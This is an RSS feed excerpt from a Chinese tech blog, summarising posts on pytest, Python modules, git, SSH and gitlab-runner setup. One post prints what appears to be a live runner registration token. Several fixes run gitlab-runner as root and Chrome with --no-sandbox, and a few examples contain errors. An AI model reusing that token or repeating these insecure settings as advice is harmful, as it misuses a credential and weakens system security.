$ python test.py The list of command line arguments: [&amp;#39;example.py&amp;#39;] 加上几个参数运行，可以看到参数被获取并输出
$ python test.py arg1 arg2 arg3 The list of command line arguments: [&amp;#39;example.py&amp;#39;, &amp;#39;arg1&amp;#39;, &amp;#39;arg2&amp;#39;, &amp;#39;arg3&amp;#39;] 3.sys.path A list of strings that specifies the search path for modules.</description>
    </item>
    
    <item>
      <title>Pytest(4)——assert 断言</title>
      <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytest4assert-%E6%96%AD%E8%A8%80/</link>
      <pubDate>Sun, 31 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytest4assert-%E6%96%AD%E8%A8%80/</guid>
      <description>参考原文：assert断言详细使用 @小菠萝测试笔记 
 1.前言  与unittest不同，pytest使用的是python自带的assert关键字来进行断言 assert关键字后面可以接一个表达式，只要表达式的最终结果为True，那么断言通过，用例执行成功，否则用例执行失败  2.实例 # 异常信息 def f(): return 3 def test_function(): a = f() assert a % 2 == 0, &amp;#34;判断 a 为偶数，当前 a 的值为：%s&amp;#34; % a 3.常用断言  assert xx ：判断 xx 为真 assert not xx ：判断 xx 不为真 assert a in b ：判断 b 包含 a assert a == b ：判断 a 等于 b assert a != b ：判断 a 不等于 b  4.</description>
    </item>
    
    <item>
      <title>Python(21)——yield 生成器的用法</title>
      <link>https://ac-lm.github.io/posts/python/python21yield-%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E7%94%A8%E6%B3%95/</link>
      <pubDate>Sun, 17 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python21yield-%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E7%94%A8%E6%B3%95/</guid>
      <description>1.generator（生成器） 带有 yield 的函数在 Python 中被称之为 generator（生成器），而不是一个函数，这个生成器带有一个next函数，在调用 next 时函数才会执行，执行到 yield 停止，下一次的 next 开始的地方是接着上一次的 next 停止的地方执行。
def foo(): print(&amp;#34;starting...&amp;#34;) while True: yield 5 res = yield 4 print(&amp;#34;res:&amp;#34;,res) g = foo() print(next(g)) print(next(g)) print(next(g)) 2.为什么需要 yield for i in range(1000): pass 这个循环在运行中占用的内存会随着 range() 的参数的增大而增大，range() 会生成一个List。如果要控制内存占用，最好不要用 List
for i in xrange(1000): pass 在python2中这样写则不会生成一个 1000 个元素的 List，而是在每次迭代中返回下一个数值，内存空间占用很小。因为 xrange 不返回 List，而是返回一个 iterable 对象。【iterable意思为迭代，可以理解为连续的一组数据，可以遍历的数据，包含内置的string、list、dict、tuple、set()】
在 Python3 中则是 yield</description>
    </item>
    
    <item>
      <title>Pytest(3)——fixture 实现 setup 和 teardown</title>
      <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytest3fixture-%E5%AE%9E%E7%8E%B0-setup-%E5%92%8C-teardown/</link>
      <pubDate>Sat, 16 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytest3fixture-%E5%AE%9E%E7%8E%B0-setup-%E5%92%8C-teardown/</guid>
      <description>1.setup 与 fixture 的启动顺序 fixture 的启动在 setup 之前，在 fixture 执行完之后执行 setup
2.setup 和 teardown 的实现 通过使用 yield 关键字实现teardown 操作
@pytest.fixture() def open(): print(&amp;#34;打开浏览器，并且打开百度&amp;#34;) yield print(&amp;#34;执行teardown&amp;#34;)  如果其中一个用例出现异常，不影响 yield 后面的 teardown 执行，并且全部用例执行完之后，yield 呼唤 teardown 操作 如果在 setup 就异常了，那么是不会去执行 yield 后面的 teardown 内容了  </description>
    </item>
    
    <item>
      <title>Python(20)——Web LocalStorage 修改</title>
      <link>https://ac-lm.github.io/posts/python/python20web-localstrorage-%E4%BF%AE%E6%94%B9/</link>
      <pubDate>Sat, 16 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python20web-localstrorage-%E4%BF%AE%E6%94%B9/</guid>
      <description>1.目标 修改 LocalStorage 和 SessionStorage 中的 token
2.实现 使用 JavaScript 进行获取 token 和修改 token 的操作
1.设置localStorage Storage.set = function(name, val) { localStorage.setItem(name, val); } 2.获取localStorage Storage.get = function(name) { return localStorage.getItem(name); } 3.调用函数 Storage.set(&amp;#34;status&amp;#34;, &amp;#34;OK&amp;#34;); Storage.set(&amp;#34;quit&amp;#34;, &amp;#34;...&amp;#34;); console.log(Storage.get(&amp;#34;status&amp;#34;)); </description>
    </item>
    
    <item>
      <title>BUG(15)——git 提示 LF will be replaced by CRLF</title>
      <link>https://ac-lm.github.io/posts/bug/bug15git-%E6%8F%90%E7%A4%BA-lf-will-be-replaced-by-crlf/</link>
      <pubDate>Fri, 15 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug15git-%E6%8F%90%E7%A4%BA-lf-will-be-replaced-by-crlf/</guid>
      <description>BUG 描述 在 windows 平台下使用 git add，git deploy 文件时经常出现warning: LF will be replaced by CRLF的提示
Resolution 这是因为在文本处理中，CR（CarriageReturn）/ LF（LineFeed）是不同操作系统上使用的换行符，当我们在 Windows 上的编辑器打开文件时，编辑器会把行尾的换行（LF）字符转换成回车（CR）和换行（LF），或在用户按下 Enter 键时，插入回车（CR）和换行（LF）两个字符。
在 Linux 下，命令 unix2dos 可以把 Linux 文件格式转换成 Windows 文件格式，命令 dos2unix 可以把 Windows 格式转换成 Linux 文件格式。
 Dos 和 Windows 平台： 使用回车（CR）和换行（LF）两个字符来结束一行，回车+换行(CR+LF)，即（\r\n） Mac 和 Linux 平台：只使用换行（LF）一个字符来结束一行，即(\n) 回车符就是回到一行的开头，用符号 r 表示，十进制 ASCII 代码是 13，十六进制代码为 0x0D 换行符就是另起一行，用 n 符号表示，ASCII 代码是 10，十六制为 0x0A 我们平时编写文件的回车符应该确切来说叫做回车换行符  Git 可以在你提交时自动地把回车（CR）和换行（LF）转换成换行（LF），而在检出（检查出入）代码时把换行（LF）转换成回车（CR）和换行（LF）。如果是在 Windows 系统上，把它设置成 true，这样在检出代码时，换行会被转换成回车和换行。
# 提交时转换为LF，检出时转换为CRLF git config --global core.</description>
    </item>
    
    <item>
      <title>Pytest(2)——fixture</title>
      <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytest2fixture/</link>
      <pubDate>Fri, 15 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytest2fixture/</guid>
      <description>fixture是pytest提供给测试环境初始化与清理的一个函数，通过语法糖@pytest.fixture()，测试用例会在测试开始前与测试结束后自动的执行@pytest.fixture()标记的函数，完成测试环境的初始化与清理。
1.fixture 的优势  1.有独立的命名，并通过声明它们从测试函数、模块、类或整个项目中的使用来激活。 2.按模块化的方式实现，每个fixture都可以互相调用。 3.fixture的范围从简单的单元测试到复杂的功能测试，可以对fixture配置参数，或者跨函数function，类class，模块module或整个测试session范围。  2.fixture 当做参数传入 定义fixture跟定义普通函数差不多，唯一区别就是在函数上加个装饰器@pytest.fixture()，fixture命名不要以test开头，跟用例区分开。fixture是有返回值得，没有返回值默认为None。用例调用fixture的返回值，直接就是把fixture的函数名称当做变量名称。
@pytest.fixture() def K(): a = &amp;#39;leo&amp;#39; return a def test2(K): assert test1 == &amp;#39;leo&amp;#39; 3.使用多个 fixture 如果用例需要用到多个fixture的返回数据，fixture也可以返回一个元祖，list或字典，然后从里面取出对应数据。
@pytest.fixture() def test1(): a = &amp;#39;leo&amp;#39; b = &amp;#39;123456&amp;#39; print(&amp;#39;传出a,b&amp;#39;) return (a, b) def test2(test1): u = test1[0] p = test1[1] assert u == &amp;#39;leo&amp;#39; assert p == &amp;#39;123456&amp;#39; print(&amp;#39;元祖形式正确&amp;#39;) 4.fixture 的作用范围 fixture里面有个scope参数可以控制fixture的作用范围：session&amp;gt;module&amp;gt;class&amp;gt;function
 function：每一个函数或方法都会调用 class：每一个类调用一次，一个类中可以有多个方法 module：每一个.py文件调用一次，该文件内又有多个function和class session：是多个文件调用一次，可以跨.py文件调用，每个.py文件就是module  5.fixture 的参数 fixture（scope=&amp;#39;function&amp;#39;，params=None，autouse=False，ids=None，name=None）  scope：有四个级别参数&amp;quot;function&amp;quot;（默认），&amp;ldquo;class&amp;rdquo;，&amp;ldquo;module&amp;rdquo;，&amp;ldquo;session&amp;rdquo; params：一个可选的参数列表。 autouse：如果True，则为所有测试都可以自动使用 fixture 函数。如果为False则显示需要传参来激活fixture ids：每个字符串id的列表，每个字符串对应于params这样他们就是测试ID的一部分。如果没有提供ID它们将从params自动生成 name：fixture的名称。这默认为装饰函数的名称。  6.</description>
    </item>
    
    <item>
      <title>Python(19)——telnetlib 模块</title>
      <link>https://ac-lm.github.io/posts/python/python19telnetlib-%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Fri, 15 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python19telnetlib-%E6%A8%A1%E5%9D%97/</guid>
      <description>telnetlib Python 远程 Linux 模块
import getpass import telnetlib HOST = &amp;#34;localhost&amp;#34; user = input(&amp;#34;Enter your remote account: &amp;#34;) password = getpass.getpass() tn = telnetlib.Telnet(HOST) tn.read_until(b&amp;#34;login: &amp;#34;) tn.write(user.encode(&amp;#39;ascii&amp;#39;) + b&amp;#34;\n&amp;#34;) if password: tn.read_until(b&amp;#34;Password: &amp;#34;) tn.write(password.encode(&amp;#39;ascii&amp;#39;) + b&amp;#34;\n&amp;#34;) tn.write(b&amp;#34;ls\n&amp;#34;) tn.write(b&amp;#34;exit\n&amp;#34;) print(tn.read_all().decode(&amp;#39;ascii&amp;#39;)) </description>
    </item>
    
    <item>
      <title>BUG(14)——bash 命令丢失</title>
      <link>https://ac-lm.github.io/posts/bug/bug14bash-%E5%91%BD%E4%BB%A4%E4%B8%A2%E5%A4%B1/</link>
      <pubDate>Thu, 14 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug14bash-%E5%91%BD%E4%BB%A4%E4%B8%A2%E5%A4%B1/</guid>
      <description>BUG 描述 在 Linux shell 中执行 ls 命令时，报错 bash：ls command not found
Resolution 由于环境变量 PATH 被错误修改，导致命令丢失
# 命令行执行，恢复环境变量 export PATH=/bin:/usr/bin:$PATH </description>
    </item>
    
    <item>
      <title>Pytest(1)——Pytest 测试框架</title>
      <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytest1pytest-%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</link>
      <pubDate>Thu, 14 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytest1pytest-%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</guid>
      <description>1.安装 pip install -U pytest 2.运行 python3 -m pytest --help pytest.main([&amp;#39;-s&amp;#39;]) pytest.main([&amp;#39;-x&amp;#39;, &amp;#39;mytestdir&amp;#39;]) # []内传入配置参数，相对于执行 pytest -s  3.约束 文件名以test_*.py文件和*_test.py 以test_开头的函数 以Test开头的类，并且不能带有 init 方法 以test_开头的方法 所有的包pakege必须要有__init__.py文件 4.参数选择 # 查看 pytest 版本 pytest --version # 显示可用的内置函数参数 pytest --fixtures # 通过命令行查看帮助信息及配置文件选项 pytest --help # 在第N个用例失败后，结束测试执行 pytest -x # 第01次失败，就停止测试 pytest --maxfail=2 # 出现2个失败就终止测试 # 指定测试目录 pytest testing/ # 通过关键字表达式过滤执行 # 这条命令会匹配文件名、类名、方法名匹配表达式的用例，这里这条命令会运行 TestMyClass.test_something， 不会执行 TestMyClass.test_method_simple pytest -k &amp;#34;MyClass and not method&amp;#34; # 运行模块中的指定用例 pytest test_mod.</description>
    </item>
    
    <item>
      <title>Python(18)——执行 Linux 命令</title>
      <link>https://ac-lm.github.io/posts/python/python18%E6%89%A7%E8%A1%8C-linux-%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Thu, 14 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python18%E6%89%A7%E8%A1%8C-linux-%E5%91%BD%E4%BB%A4/</guid>
      <description>1.subprocess 模块 根据 Python 官方文档说明，subprocess模块用于取代下面这些模块。推荐使用
&amp;gt;&amp;gt;&amp;gt; from subprocess import call &amp;gt;&amp;gt;&amp;gt; call([&amp;#34;ls&amp;#34;, &amp;#34;-l&amp;#34;]) 2.os 模块的 system 方法 system方法会创建子进程运行外部程序，方法只返回外部程序的运行结果。这个方法比较适用于外部程序没有输出结果的情况。
&amp;gt;&amp;gt;&amp;gt; import os &amp;gt;&amp;gt;&amp;gt; os.system(&amp;#34;echo \&amp;#34;Hello World\&amp;#34;&amp;#34;) # 直接使用os.system调用一个echo命令  Hello World ——————&amp;gt; 打印命令结果 0 ——————&amp;gt; What&amp;#39;s this ? 返回值？  &amp;gt;&amp;gt;&amp;gt; val = os.system(&amp;#34;ls -al | grep \&amp;#34;log\&amp;#34;&amp;#34;) # 使用val接收返回值  -rw-r--r-- 1 root root 6030829 Dec 31 15:14 log ——————&amp;gt; 此时只打印了命令结果 &amp;gt;&amp;gt;&amp;gt; print val 0 ——————&amp;gt; 注意，此时命令正常运行时，返回值是0 &amp;gt;&amp;gt;&amp;gt; val = os.</description>
    </item>
    
    <item>
      <title>BUG(13)——Linux中Chrome无法启动缺少权限</title>
      <link>https://ac-lm.github.io/posts/bug/bug13linux-%E4%B8%AD-chrome-%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8/</link>
      <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug13linux-%E4%B8%AD-chrome-%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8/</guid>
      <description>BUG 描述 linux 下 Python 脚本 selenium 无法启动 Chrome，报错
unknown error: DevToolsActivePort file doesn&#39;t exist
Resolution Chrome 在 Linux 下权限不足，需要添加以下属性以 Root 运行
options.add_argument(&amp;#39;--no-sandbox&amp;#39;) # 不在沙盒运行，以 Root 权限运行 </description>
    </item>
    
    <item>
      <title>Git(4)——.gitlab-ci.yml 文件配置</title>
      <link>https://ac-lm.github.io/posts/git/git4.gitlab-ci.yml-%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/git/git4.gitlab-ci.yml-%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/</guid>
      <description>参考原文：.gitlab-ci.yml语法 @hellojinni 
 1..gitlab-ci.yml 文件 GitLab CI 使用 YAML文件(.gitlab-ci.yml) 来管理项目配置，用来配置 CI 在你的项目中做哪些操作，这个文件位于仓库的根目录。
当有新内容 push 到仓库，或者有代码合并后， GitLab 会查找是否有 .gitlab-ci.yml 文件，如果文件存在， Runners 将会根据该文件的内容开始 build 本次 commit 。
.gitlab-ci.yml 使用 YAML 语法， 你需要格外注意缩进格式，要用空格来缩进，不能用 tabs 来缩进。
2.Stages Stages 表示构建阶段，说白了就是上面提到的流程。默认有3个 stages ： build , test , deploy 。我们可以在一次 Pipeline 中定义多个 Stages ，这些 Stages 会有以下特点：
 所有 Stages 会按照顺序运行，即当一个 Stage 完成后，下一个 Stage 才会开始 只有当所有 Stages 完成后，该构建任务 (Pipeline) 才会成功 如果任何一个 Stage 失败，那么后面的 Stages 不会执行，该构建任务 (Pipeline) 失败  3.</description>
    </item>
    
    <item>
      <title>Python(17)——Python面试知识</title>
      <link>https://ac-lm.github.io/posts/python/python17python-%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86/</link>
      <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python17python-%E9%9D%A2%E8%AF%95%E7%9F%A5%E8%AF%86/</guid>
      <description>1.语言的分类 ①编译型语言和解释性语言 编译型语言是指在程序执行之前，有一个单独的编译过程，将程序翻译成机器语言，以后执行这个程序的时候，就不用再进行翻译了。解释型语言是指是在运行的时候将程序翻译成机器语言，所以运行速度相对于编译型语言要慢。C/C++ 等都是编译型语言，而Java，C#等都是解释型语言。虽然Java程序在运行之前也有一个编译过程，但是并不是将程序编译成机器语言，而是将它编译成字节码（可以理解为一个中间语言）。在运行的时候，由JVM将字节码再翻译成机器语言。
②动态语言和静态语言  动态类型语言：动态类型语言是指在运行期间才去做数据类型检查的语言，也就是说，在用动态类型的语言编程时，永远也不用给任何变量指定数据类型。如python和ruby等。 静态类型语言：它的数据类型是在编译其间检查的，也就是说在写程序时要声明所有变量的数据类型。如C/C++,java,C#等。  ③强类型定义语言和弱类型定义语言  强类型定义语言：强制数据类型定义的语言。也就是说，一旦一个变量被指定了某个数据类型，如果不经过强制转换，那么它就永远是这个数据类型了,如python。 弱类型定义语言：数据类型可以被忽略的语言。它与强类型定义语言相反, 一个变量可以赋不同数据类型的值。如VScript。  2.python的优点  ①Python的定位是“优雅”、“明确”、“简单”，所以Python程序看上去总是简单易懂，初学者学Python，不但入门容易，而且将来深入下去，可以编写那些非常非常复杂的程序。 ②开发效率非常高，Python有非常强大的第三方库，基本上你想通过计算机实现任何功能，Python官方库里都有相应的模块进行支持，直接下载调用后，在基础库的基础上再进行开发，大大降低开发周期，避免重复造轮子。 ③高级语言————当你用Python语言编写程序的时候，你无需考虑诸如如何管理你的程序使用的内存一类的底层细节 ④可移植性————由于它的开源本质，Python已经被移植在许多平台上（经过改动使它能够工 作在不同平台上）。如果你小心地避免使用依赖于系统的特性，那么你的所有Python程序无需修改就几乎可以在市场上所有的系统平台上运行 ⑤可扩展性————如果你需要你的一段关键代码运行得更快或者希望某些算法不公开，你可以把你的部分程序用C或C++编写，然后在你的Python程序中使用它们 ⑥可嵌入性————你可以把Python嵌入你的C/C++程序，从而向你的程序用户提供脚本功能。  3.python的缺点  ①速度慢，Python 的运行速度相比C语言确实慢很多，跟JAVA相比也要慢一些，因此这也是很多所谓的大牛不屑于使用Python的主要原因，但其实这里所指的运行速度慢在大多数情况下用户是无法直接感知到的，必须借助测试工具才能体现出来，其实在大多数情况下Python已经完全可以满足你对程序速度的要求，除非你要写对速度要求极高的搜索引擎等，这种情况下，当然还是建议你用C去实现的。 ②代码不能加密，因为PYTHON是解释性语言，它的源码都是以名文形式存放的，不过我不认为这算是一个缺点，如果你的项目要求源代码必须是加密的，那你一开始就不应该用Python来去实现。 ③线程不能利用多CPU问题，这是Python被人诟病最多的一个缺点，GIL即全局解释器锁（Global Interpreter Lock），是计算机程序设计语言解释器用于同步线程的工具，使得任何时刻仅有一个线程在执行，Python的线程是操作系统的原生线程。在Linux上为pthread，在Windows上为Win thread，完全由操作系统调度线程的执行。一个python解释器进程内有一条主线程，以及多条用户程序的执行线程。即使在多核CPU平台上，由于GIL的存在，所以禁止多线程的并行执行。关于这个问题的折衷解决方法，我们在以后线程和进程章节里再进行详细探讨。  4.在编写Python程序时，/usr/bin/python和/usr/bin/env python的区别？  #!/usr/bin/python是告诉操作系统执行这个脚本的时候，调用/usr/bin下的python解释器 #!/usr/bin/env python这种用法是为了防止操作系统用户没有将python装在默认的/usr/bin路径里。当系统看到这一行的时候，首先会到env设置里查找python的安装路径，再调用对应路径下的解释器程序完成操作。 #!/usr/bin/python相当于写死了python路径 #!/usr/bin/env python会去环境设置寻找python目录,推荐这种写法  5.变量  ①变量名只能是字母、数字或下划线的任意组合 ②变量名的第一个字符不能是数字 ③以下关键字不能声明为变量名 [&amp;lsquo;and&amp;rsquo;, &amp;lsquo;as&amp;rsquo;, &amp;lsquo;assert&amp;rsquo;, &amp;lsquo;break&amp;rsquo;, &amp;lsquo;class&amp;rsquo;, &amp;lsquo;continue&amp;rsquo;, &amp;lsquo;def&amp;rsquo;, &amp;lsquo;del&amp;rsquo;, &amp;lsquo;elif&amp;rsquo;, &amp;lsquo;else&amp;rsquo;, &amp;lsquo;except&amp;rsquo;, &amp;lsquo;exec&amp;rsquo;, &amp;lsquo;finally&amp;rsquo;, &amp;lsquo;for&amp;rsquo;, &amp;lsquo;from&amp;rsquo;, &amp;lsquo;global&amp;rsquo;, &amp;lsquo;if&amp;rsquo;, &amp;lsquo;import&amp;rsquo;, &amp;lsquo;in&amp;rsquo;, &amp;lsquo;is&amp;rsquo;, &amp;lsquo;lambda&amp;rsquo;, &amp;lsquo;not&amp;rsquo;, &amp;lsquo;or&amp;rsquo;, &amp;lsquo;pass&amp;rsquo;, &amp;lsquo;print&amp;rsquo;, &amp;lsquo;raise&amp;rsquo;, &amp;lsquo;return&amp;rsquo;, &amp;lsquo;try&amp;rsquo;, &amp;lsquo;while&amp;rsquo;, &amp;lsquo;with&amp;rsquo;, &amp;lsquo;yield&amp;rsquo;] ④变量名要见名之义。  6.</description>
    </item>
    
    <item>
      <title>Windows(2)——利用搜索实现批量文件移动</title>
      <link>https://ac-lm.github.io/posts/windows10/windows2%E5%88%A9%E7%94%A8%E6%90%9C%E7%B4%A2%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E6%96%87%E4%BB%B6%E7%A7%BB%E5%8A%A8/</link>
      <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/windows10/windows2%E5%88%A9%E7%94%A8%E6%90%9C%E7%B4%A2%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E6%96%87%E4%BB%B6%E7%A7%BB%E5%8A%A8/</guid>
      <description>如何实现  在系统中找到目标文件夹 查看文件夹中文件的格式，如.jpg .png .txt 在确定了大多数文件夹中的格式后，在右上角搜索框，输入格式如.txt 正则匹配文件名 在出现的搜索结果中，按住Ctrl+A选择全部，按住Ctrl+C复制全部，然后，在其他地方新建文件夹，按住Ctrl+V提取所有选择的文件到新文件中即可  </description>
    </item>
    
    <item>
      <title>Windows(1)——CMD</title>
      <link>https://ac-lm.github.io/posts/windows10/windows1cmd/</link>
      <pubDate>Sun, 10 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/windows10/windows1cmd/</guid>
      <description>常用的CMD命令  进入D盘：D: 列出所有文件：dir 显示Windos版本：VER 创建文件夹：MKDIR file 清除屏幕：CLS 查看某个命令的地址：where java 检查网络：ipconfig 检查系统配置：dxdiag  </description>
    </item>
    
    <item>
      <title>Git(3)——gitlab-runner 安装配置</title>
      <link>https://ac-lm.github.io/posts/git/git3gitlab-runner-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Thu, 07 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/git/git3gitlab-runner-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</guid>
      <description>1.Linux 注册 gitlab-runner sudo gitlab-runner register Runtime platform arch=amd64 os=linux pid=3639 revision=943fc252 version=13.7.0 Running in system-mode. Enter the GitLab instance URL (for example, https://gitlab.com/): # http://gitlab.hison.net/ Enter the registration token: # WDKcwQGUoXRC-NR3rUns Enter a description for the runner: #  Enter the tags for the runner: #  Enter the runner executor: # shell ——————————————————————————————————————————————————————————————————————————————————————————————————————————— # 文档 sudo gitlab-runner register Enter your GitLab instance URL (also known as the gitlab-ci coordinator URL).</description>
    </item>
    
    <item>
      <title>BUG(11)——gitlab-runner无权限</title>
      <link>https://ac-lm.github.io/posts/bug/bug11gitlab-runner-%E6%97%A0%E6%9D%83%E9%99%90/</link>
      <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug11gitlab-runner-%E6%97%A0%E6%9D%83%E9%99%90/</guid>
      <description>Resolution 需要手动将 gitlab-runner 服务设置为 root 用户
ps aux|grep gitlab-runner # 查看当前 runner 用户 sudo gitlab-runner uninstall # 删除 gitlab-runner gitlab-runner install --working-directory /home/gitlab-runner --user root # 设置 root 用户 sudo service gitlab-runner restart # 重启gitlab-runner ps aux|grep gitlab-runner # 再次执行会发现 --user 的用户名已经更换成root了 </description>
    </item>
    
    <item>
      <title>BUG(12)——gitlab CI 无法运行无标签的工作</title>
      <link>https://ac-lm.github.io/posts/bug/bug12gitlab-ci-%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8C%E6%97%A0%E6%A0%87%E7%AD%BE%E7%9A%84%E5%B7%A5%E4%BD%9C/</link>
      <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug12gitlab-ci-%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8C%E6%97%A0%E6%A0%87%E7%AD%BE%E7%9A%84%E5%B7%A5%E4%BD%9C/</guid>
      <description>BUG 描述 gitlab CI 无法执行没有标记标签的工作
Resolution 在设置中勾选 Run untagged jobs
gitlab 项目设置 -&amp;gt; CI/CD -&amp;gt; Runner，点击编辑按钮，修改 Run untagged jobs / Indicates whether this runner can pick jobs without tags</description>
    </item>
    
    <item>
      <title>Git(2)——SSH 配置</title>
      <link>https://ac-lm.github.io/posts/git/git2ssh-%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/git/git2ssh-%E9%85%8D%E7%BD%AE/</guid>
      <description>1.配置 SSH 打开 Git 命令行工具，输入以下命令，使用邮箱创建密码对
ssh-keygen -t rsa -b 2048 -C &amp;#34;email@example.com&amp;#34; 有此结果，在对应目录/home/user/.ssh/id_rsa下找到生成的公钥文件 id_rsa.pub，记事本打开，将里面的内容复制到剪贴板
Generating docs/private rsa key pair. Enter file in which to save the key (/home/user/.ssh/id_rsa): 打开新建的 github 或者 gitlab 账户，找到 SSH Keys 选项setting-&amp;gt;SSH keys，将剪贴板内容粘贴到内容框中，title 可以用默认的邮箱名字，最后点击 add。这就代表这个用户被远程仓库所承认了
选择克隆的项目，复制 SSH 克隆 URL，进行克隆
git clone + 库的地址 2.创建SSH的目的 SSH KEY 的作用是来识别你的电脑，相当于人的身份证号，在你的 C 盘用户目录下面 (:\Users\LX) 存在一个 .ssh 目录，这个目录下有 id_rsa 和 id_rsa.pub 两个文件，这两个就是 SSH Key 的秘钥对，id_rsa 是私钥，不能泄露出去，id_rsa.pub 是公钥，可以放心地告诉任何人。</description>
    </item>
    
    <item>
      <title>Python(16)——ddt 模块</title>
      <link>https://ac-lm.github.io/posts/python/python16ddt-%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Wed, 06 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python16ddt-%E6%A8%A1%E5%9D%97/</guid>
      <description>1.简介 DDT(Data Driven Testing)，数据驱动，简单来说就是测试数据的参数化，在python中DDT以装饰器的形式，结合单元测试一起来使用，用来装饰测试类，为测试用例传递参数
pip install ddt 2.ddt 的两个方法装饰器 data：包含多个你想要传给测试用例的参数，适用动态参数，把传进来的数组组成元组，再对元组进行用例的遍历，根据索引取值相当于对每个参数进行遍历
file_data：会从json或yaml中加载数据
3.ddt 的方法 unpanck：通常data中包含的每一个值都会作为一个单独的参数传给测试方法，如果这些值是用元组或者列表传进来的，可以用unpack方法将其自动分解成多个参数
@data(a,b) # a和b各运行一次用例 @data([a,d],[c,d]) # 如果没有unpack，那么[a,b]当成一个参数传入用例运行 # 如果有unpack，那么[a,b]被分解开，按照用例中的两个参数传递 4.ddt 的类装饰器 ddt.ddt：对类使用
5.举例 import unittest import ddt #第三方库 data=[[1,2],[3,4],[5,6]] @ddt.ddt class MyTestCase(unittest.TestCase): # 只有一个参数时 @ddt.data(1,2,3) def test_01(self,a): print(a) #表示可变参数取值为data([1,2],[3,4],[5,6])，若传参是data,则后面的取值 data([[1,2],[3,4],[5,6]]) @ddt.data(*data) @ddt.unpack def test_02(self,a,b): print(a,&amp;#39;----&amp;#39;,b) @ddt.data([1,2],[3,4])#和上面的相似，这里未使用变量 @ddt.unpack def test_03(self,a,b): print(a, &amp;#39;----&amp;#39;, b) </description>
    </item>
    
    <item>
      <title>allure(1)——测试报告生成</title>
      <link>https://ac-lm.github.io/posts/pytest&#43;allure/allure1%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E7%94%9F%E6%88%90/</link>
      <pubDate>Tue, 05 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/pytest&#43;allure/allure1%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E7%94%9F%E6%88%90/</guid>
      <description>1.命令使用 #----- generate ------------------------------ allure generate DIR -o DIR -c DIR # 参数：-c, --clean 在生成新的Allure报告之前，先清除该目录 # 参数： -o, --report-dir, --output 指定目录生成allure报告 #----- open ------------------------------ allure open DIR # 参数：-h, --host 指定域名地址 # 参数：-p, --port 指定端口号 #----- serve ------------------------------ allure serve./report/html # 参数：-h, --host 指定域名地址 # 参数：-p, --port 指定端口号 # 测试执行，在指定目录DIR生成allure报告与如果目录存在则清除目录 pytest --alluredir=DIR --clean-alluredir 2.生成报告(前台) pytest --alluredir=/tmp/my_allure_results # 执行测试 allure serve /tmp/my_allure_results -p 33333 # 生成报告 3.生成报告(后台) nohup allure serve /tmp/my_allure_results -p 33333 &amp;gt;/tmp/run.</description>
    </item>
    
    <item>
      <title>BUG(10)——gitlab CI 无法初始化 Git 版本库</title>
      <link>https://ac-lm.github.io/posts/bug/bug10gitlab-ci-%E6%97%A0%E6%B3%95%E5%88%9D%E5%A7%8B%E5%8C%96-git-%E7%89%88%E6%9C%AC%E5%BA%93/</link>
      <pubDate>Tue, 05 Jan 2021 00:00:00 +0000</pubDate>
      
